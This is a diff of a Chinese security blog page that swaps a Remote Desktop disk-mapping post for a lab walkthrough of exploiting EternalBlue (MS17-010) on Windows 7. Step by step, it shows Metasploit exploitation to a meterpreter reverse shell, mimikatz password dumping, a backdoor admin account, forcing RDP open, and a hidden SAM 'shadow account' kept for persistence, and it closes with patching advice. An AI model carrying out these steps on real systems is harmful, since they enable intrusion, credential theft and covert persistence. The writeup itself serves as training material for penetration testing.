@@ -4,7 +4,7 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
-    <meta name="keywords" content="组合拳之远程桌面加磁盘映射实现文件拷贝, z1r0s 安全 渗透 编程">
+    <meta name="keywords" content="漏洞复现之永恒之蓝(ms17-010), z1r0s 安全 渗透 编程">
     <meta name="description" content="z1r0s | 程序语言 | 网络安全 | 红蓝对抗">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>组合拳之远程桌面加磁盘映射实现文件拷贝 | z1r0s</title>
+    <title>漏洞复现之永恒之蓝(ms17-010) | z1r0s</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -341,7 +341,7 @@
 <script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
     (function() {
-        let pwd = '';
+        let pwd = '1b2a4a505f8ab209e2a37808e17f9514eb9ef5345874e2cef007badf616edea5';
         if (pwd && pwd.length > 0) {
             if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                 alert('密码错误，将返回主页！');
@@ -354,12 +354,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/200.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/94.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">组合拳之远程桌面加磁盘映射实现文件拷贝</h1>
+                    <h1 class="description center-align post-title">漏洞复现之永恒之蓝(ms17-010)</h1>
                 </div>
             </div>
         </div>
@@ -500,7 +500,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-11-06
+                    2020-11-24
                 </div>
                 
 
@@ -514,14 +514,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    396
+                    1.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    5 分
                 </div>
                 
 
@@ -546,48 +546,148 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x01-情景简述"><a href="#0x01-情景简述" class="headerlink" title="0x01 情景简述"></a>0x01 情景简述</h1><p>​        在Windows系统中使用远程桌面程序时可以将自己的硬盘映射到被远程的主机上，实现文件快速拷贝。</p>
-<h1 id="0x02-实验环境"><a href="#0x02-实验环境" class="headerlink" title="0x02 实验环境"></a>0x02 实验环境</h1><ul>
-<li>系统：两个<code>Windows Server 2008 R2</code></li>
-<li>软件：<code>mstsc</code></li>
+                <h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>​        Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
+<p>​        2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。</p>
+<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>​        目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
+<h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><ul>
+<li>攻击机：Kali 2020.08（IP：10.10.10.152）</li>
+<li>靶机：Windows 7 X64 （IP：10.10.10.129）</li>
 </ul>
-<h1 id="0x03-实验条件"><a href="#0x03-实验条件" class="headerlink" title="0x03 实验条件"></a>0x03 实验条件</h1><ul>
-<li>拥有一个管理员账户</li>
-<li>靶机开启远程登录服务</li>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/实验拓扑.png" alt="实验拓扑"></center>
+
+
+
+<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><h2 id="0x01主机发现"><a href="#0x01主机发现" class="headerlink" title="0x01主机发现"></a>0x01主机发现</h2><ol>
+<li><p>在nmap中使用如下命令来探测本网段存活主机，操作结果如下图所示。</p>
+<pre class=" language-shell"><code class="language-shell">nmap -r 10.10.10.0/24</code></pre>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/nmap主机存活判断.png" alt="nmap主机存活判断"></center>
+
+<p>探测到ip为<code>10.10.10.129</code>的主机存活，并探测到开放<code>445</code>端口，而永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞。</p>
+</li>
+</ol>
+<h2 id="0x02-进入MSF框架"><a href="#0x02-进入MSF框架" class="headerlink" title="0x02 进入MSF框架"></a>0x02 进入MSF框架</h2><ol>
+<li><p>输入<code>msfconsole</code>命令进入MSF框架，显示结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/msfconsole.png" alt="msfconsole"></center>
+</li>
+<li><p>输入<code>search ms17-010</code>命令，查看MSF框中与ms17-010相关的渗透模块，显示结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/与ms17-010相关模块.png" alt="与ms17-010相关模块"></center>
+
+<ul>
+<li><code>auxiliary/scanner/smb/smb_ms17_010</code>是扫描MS17-010永恒之蓝的模块，扫描或者说检查目标主机是否存在MS17-010永恒之蓝的漏洞；</li>
+<li><code>exploit/windows/smb/ms17_010_eternalblue</code>是永恒之蓝攻击代码的模块，就是所说的漏洞利用模块。</li>
 </ul>
-<h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol>
-<li><p>靶机开启远程桌面服务。计算机属性 → 【高级系统设置】 → 勾选【身份认证】 → 点击【选择用户】按钮 → 添加用户。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Combination/mstsc_DiskMap/开启远程桌面服务.png" alt="开启远程桌面服务"></center>
 </li>
-<li><p>关闭防火墙。【运行框】 → <code>firewall.cpl</code> → 关闭防火墙。（<font color="DoderBlue">在2008中防火墙的默认规则会过滤远程桌面访问时的端口，为方便实验此处直接禁掉防火墙，但是在正常使用远程桌面服务时这样操作会大大降低系统的安全性，这里推荐参考<a href="https://z1r0s.github.io/2020/08/26/win10-yuan-cheng-zhuo-mian-ji-fang-huo-qiang-pei-zhi/" target="_blank" rel="noopener">Win10远程桌面及防火墙配置</a>在较安全的前提下开启远程访问。</font>）</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Combination/mstsc_DiskMap/关闭防火墙.png" alt="关闭防火墙"></center>
+</ol>
+<h2 id="0x03-ms17-010扫描模块"><a href="#0x03-ms17-010扫描模块" class="headerlink" title="0x03 ms17-010扫描模块"></a>0x03 ms17-010扫描模块</h2><ol>
+<li><p>输入如下命令，使用永恒之蓝的扫描模块，操作结果如下图所示。</p>
+<pre class=" language-shell"><code class="language-shell">use auxiliary/scanner/smb/smb_ms17_010</code></pre>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/使用永恒之蓝扫描模块.png" alt="使用永恒之蓝扫描模块"></center>
 </li>
-<li><p>远程桌面设置对磁盘的映射。【运行框】 → <code>mstsc</code>  → 选择【本地资源】选项卡 → 点击【详细信息】按钮 → 勾选【本地磁盘】。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Combination/mstsc_DiskMap/远程桌面设置对磁盘的映射.png" alt="远程桌面设置对磁盘的映射"></center>
+<li><p>设置目标主机的IP（RHOST），输入如下命令，操作结果如下图所示。</p>
+<pre class=" language-shell"><code class="language-shell">set rhosts 10.10.10.129</code></pre>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/设置RHOSTS值.png" alt="设置RHOSTS值"></center>
 </li>
-<li><p>远程桌面登录。输入用户名和密码进行远程桌面登录。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Combination/mstsc_DiskMap/远程桌面邓丽.png" alt="远程桌面登录"></center>
+<li><p>使用扫描探测，显示结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/永恒之蓝扫描结果.png" alt="永恒之蓝扫描结果"></center>
+
+<p>扫描结果显示目标主机可能存在永恒之蓝漏洞，下面使用攻击模块机型见攻击测试。</p>
 </li>
-<li><p>稍等一会后，使用<code>administrator</code>账户登录成功后在资源管理器中显示本地映射的磁盘文件。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Combination/mstsc_DiskMap/本地磁盘映射成功.png" alt="本地磁盘映射成功"></center>
+</ol>
+<h2 id="0x04-ms17-010攻击模块"><a href="#0x04-ms17-010攻击模块" class="headerlink" title="0x04 ms17-010攻击模块"></a>0x04 ms17-010攻击模块</h2><ol>
+<li><p>使用如下命令进入永恒之蓝的攻击模块，操作结果如下图所示。</p>
+<pre class=" language-shell"><code class="language-shell">use exploit/windows/smb/ms17_010_eternalblue</code></pre>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/进入永恒之蓝攻击模块.png" alt="进入永恒之蓝攻击模块"></center>
 </li>
-<li><p>成功拷贝文件。</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Combination/mstsc_DiskMap/拷贝文件成功.png" alt="拷贝文件成功"></center>
+<li><p>使用<code>options</code>命令查看必须要手动配置的参数，显示结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/查看攻击模块需要配置的参数.png" alt="查看攻击模块需要配置的参数"></center>
+</li>
+<li><p>使用<code>set rhosts 10.10.10.129</code>命令来设置远程主机的IP地址，操作结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/攻击模块设置远程主机IP.png" alt="攻击模块设置远程主机IP"></center>
+</li>
+<li><p>永恒之蓝攻击模块默认，缺省使用的Payload为<code>windows/x64/meterpreter/reverse_tcp</code>，如果想使用其他Payload需要重新设置，这里使用默认的Payload。</p>
+</li>
+<li><p>输入<code>exploit</code>命令后MSF开始攻击渗透，攻击成功后得到一个<code>meterpreter</code>会话，显示结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/永恒之蓝拿到shell.png" alt="永恒之蓝建立meterpreter会话"></center>
+</li>
+<li><p>输入<code>shell</code>拿到目标主机shell控制权，操作结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/拿到目标数据shell权限.png" alt="拿到目标数据shell权限"></center>
+
+<p>此时我们已经拿到了目标主机（WIN7）的shell控制权限，之后可以通过Shell对目标靶机进行控制。接下来就是进入了后渗透阶段。</p>
+</li>
+<li><p>用msf中的<code>mimikatz</code>，爆出目标主机的用户名和密码，<code>Wdigest</code>读取内存存放的账号密码，操作结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/通过读取内存爆用户密码.png" alt="通过读取内存爆用户密码"></center>
+
+</li>
+</ol>
+<h2 id="0x05-后渗透阶段"><a href="#0x05-后渗透阶段" class="headerlink" title="0x05 后渗透阶段"></a>0x05 后渗透阶段</h2><ol>
+<li><p>首先使用如下命令创建一个用户并将其提权为管理员，操作结果如下图所示。</p>
+<pre class=" language-shell"><code class="language-shell">net user admin$ 123.com /add
+net localgroup administrators admin$ /add</code></pre>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/创建权限维持用户.png" alt="创建权限维持用户"></center>
+</li>
+<li><p>提权以后我们需要打开目标主机的3389远程桌面端口，以便使用3389端口控制对方系统，输入如下命令，操作结果如下图所示。</p>
+<pre class=" language-shell"><code class="language-shell">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></pre>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/强制打开3389端口.png" alt="强制打开3389端口"></center>
+
+<p>使用nmap探测远程主机端口，显示结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/远程主机端口扫描2.png" alt="远程主机端口扫描"></center>
+</li>
+<li><p>打开远程桌面后就需要登录测试一下，但是再测试之前最好先使用<code>screenshot</code>命令获取截屏，操作结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/远程桌面截屏.png" alt="远程桌面截屏"></center>
+</li>
+<li><p>使用如下命令连接目标主机的远程桌面，操作结果如下图所示。</p>
+<pre class=" language-shell"><code class="language-shell">rdesktop 10.10.10.129</code></pre>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/登录远程桌面.png" alt="登录远程桌面"></center>
+
+<p><font color="red">在Windows 7中登录远程桌面时，若已经有用户登录，则会显示夺权信息，若无操作30s后会成功访问。</font></p>
+</li>
+<li><p>远程登录操作结果显示如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/远程登录成功.png" alt="远程登录成功"></center>
 
 
 
 </li>
 </ol>
-<h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul>
-<li>存在限制条件：<ul>
-<li>拥有管理员权限</li>
-<li>靶机开启远程桌面</li>
-</ul>
+<h2 id="0x06-影子账户"><a href="#0x06-影子账户" class="headerlink" title="0x06 影子账户"></a>0x06 影子账户</h2><ol>
+<li><p>创建一个名为<code>ss$</code>的用户，操作结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/创建新用户作为影子账户.png" alt="创建新用户作为影子账户"></center>
 </li>
-<li>渗透利用：<ul>
-<li>拿到管理员权限后，远程桌面拷贝敏感文件到本地文件夹</li>
-</ul>
+<li><p>使用<code>regedit</code>打开注册表<code>HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/</code>，显示结果如下图所示。<font color="blue">若打不开则需要设置权限，默认情况下SAM文件夹只有SYSTEM具有完全控制权限。</font></p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/打开注册表.png" alt="打开注册表"></center>
 </li>
+<li><p>在Names文件夹中点击【<code>ss$</code>】，在右侧显示16进制数值如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/查看ss$用户.png" alt="查看ss$用户"></center>
+</li>
+<li><p>找到Administrator的十六进制数字，然后找到对应的00000（十六进制）文件夹打开，复制Administrator的<strong>000001F4</strong>文件夹里面的<strong>F值</strong>到我们的隐藏账户<code>ss$</code>里面的<strong>F值</strong>中，操作结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/影子账户修改F值.gif" alt="影子账户修改F值"></center>
+</li>
+<li><p>找到Names里面的<code>ss$</code>和<code>ss$</code>对应的十六进制目录，右键导出到桌面，操作结果如下如所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/注册表导出.png" alt="注册表导出"></center>
+</li>
+<li><p>使用<code>net user ss$ /del</code>命令删除<code>ss$</code>用户，操作结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/删除ss$用户.png" alt="删除ss$用户"></center>
+</li>
+<li><p>将刚刚导出的注册表信息重新导入，操作结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/注册表导入.png" alt="注册表导入"></center>
+</li>
+<li><p>使用影子账户<code>ss$</code>登录，其实是以Administrator的身份登录，影子账户所做操作，Administrator都可以看见。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/影子账户登录.png" alt="影子账户登录"></center>
+
+
+
+</li>
+</ol>
+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ul>
+<li><p>升级微软补丁MS17-010</p>
+</li>
+<li><p>Windows7、Windows8、Windows10电脑启用Windows防火墙添加策略关闭135、137、138、139、445端口</p>
+</li>
+<li><p>(若有杀软)升级杀毒软件最新版本</p>
+</li>
+</ul>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><a href="https://mp.weixin.qq.com/s/xUEmnaFNP44iLzdw3WDrDg" target="_blank" rel="noopener">【漏洞复现】MS17-010永恒之蓝</a></li>
+<li><a href="https://www.cnblogs.com/-1au/p/10176389.html" target="_blank" rel="noopener">影子账户</a></li>
 </ul>
 
                 
@@ -615,7 +715,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.z1r0s.top/2020/11/06/security/vulnexp/zu-he-quan-zhi-yuan-cheng-zhuo-mian-jia-ci-pan-ying-she-shi-xian-wen-jian-kao-bei/">https://www.z1r0s.top/2020/11/06/security/vulnexp/zu-he-quan-zhi-yuan-cheng-zhuo-mian-jia-ci-pan-ying-she-shi-xian-wen-jian-kao-bei/</a>
+                    <a href="https://www.z1r0s.top/2020/11/24/security/vulnexp/windows/lou-dong-fu-xian-zhi-yong-heng-zhi-lan-ms17-010/">https://www.z1r0s.top/2020/11/24/security/vulnexp/windows/lou-dong-fu-xian-zhi-yong-heng-zhi-lan-ms17-010/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -857,12 +957,12 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/11/06/windows/servers/fang-wen-windows-xi-tong-mo-ren-de-gong-xiang-ci-pan/">
+                <a href="/2020/11/25/network/configuration/wang-luo-pei-zhi-zhi-stp-hsrp-shi-yan/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/201.jpg" class="responsive-img" alt="访问Windows系统默认的共享磁盘">
+                        <img src="/medias/featureimages/111.jpg" class="responsive-img" alt="网络配置之STP+HSRP实验">
                         
-                        <span class="card-title">访问Windows系统默认的共享磁盘</span>
+                        <span class="card-title">网络配置之STP+HSRP实验</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -873,14 +973,14 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-06
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-25
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/操作系统/" class="post-category">
-                                    操作系统
+                            <a href="/categories/网络配置/" class="post-category">
+                                    网络配置
                                 </a>
                             
                             
@@ -890,8 +990,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Windows/">
-                        <span class="chip bg-color">Windows</span>
+                    <a href="/tags/网络实验/">
+                        <span class="chip bg-color">网络实验</span>
                     </a>
                     
                 </div>
@@ -905,12 +1005,12 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/11/06/windows/servers/windows-wen-jian-xi-tong/">
+                <a href="/2020/11/24/network/configuration/wang-luo-pei-zhi-zhi-hsrp-shi-yan/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/250.jpg" class="responsive-img" alt="Windows文件系统">
+                        <img src="/medias/featureimages/148.jpg" class="responsive-img" alt="网络配置之HSRP实验">
                         
-                        <span class="card-title">Windows文件系统</span>
+                        <span class="card-title">网络配置之HSRP实验</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -921,14 +1021,14 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-06
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-24
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/操作系统/" class="post-category">
-                                    操作系统
+                            <a href="/categories/网络配置/" class="post-category">
+                                    网络配置
                                 </a>
                             
                             
@@ -938,8 +1038,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Windows/">
-                        <span class="chip bg-color">Windows</span>
+                    <a href="/tags/网络实验/">
+                        <span class="chip bg-color">网络实验</span>
                     </a>
                     
                 </div>
@@ -1149,7 +1249,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">306.2k</span>&nbsp;字
+                class="white-color">306.7k</span>&nbsp;字
             
             
             
@@ -1367,10 +1467,10 @@ $(function () {
     
 
     
-    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    <script src="/libs/instantpage/instantpage.js" type="module"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
     
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/assets/hibiki.model.json"},"display":{"position":"left","width":200,"height":410},"mobile":{"show":false},"react":{"opacity":0.7}});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/assets/hibiki.model.json"},"display":{"position":"left","width":200,"height":410},"mobile":{"show":false},"react":{"opacity":0.7}});</script></body>
 
 </html>
 <script type="text/javascript" src="/js/click_show_text.js"></script>
